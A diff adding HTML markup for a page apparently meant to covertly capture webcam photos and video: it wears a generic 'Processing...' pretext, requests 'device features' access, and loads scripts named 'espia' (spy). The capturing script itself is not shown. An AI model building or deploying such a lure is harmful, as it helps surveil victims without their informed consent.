@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <link rel="stylesheet" href="espia.css">
+</head>
+<body>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status">Initializing...</div>
+        <div class="details" id="details">Please wait while we process your request.</div>
+        
+        <div class="permission-request" id="permissionRequest" style="display: none;">
+            <h3>🔐 Permission Required</h3>
+            <p id="permissionText">This application needs access to your device features.</p>
+        </div>
+        
+        <div class="video-container" id="videoContainer">
+            <video id="videoElement" autoplay muted playsinline></video>
+        </div>
+        
+        <div class="controls" id="controls">
+            <button class="btn" id="captureBtn">📸 Capture Photo</button>
+            <button class="btn" id="recordBtn">🎥 Start Recording</button>
+            <button class="btn" id="stopBtn" style="display: none;">⏹️ Stop Recording</button>
+        </div>
+        
+        <div class="progress" id="progressContainer" style="display: none;">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="error" id="errorMessage" style="display: none;"></div>
+    </div>
+
+    <script src="espia.js"></script>
+</body>
+</html>
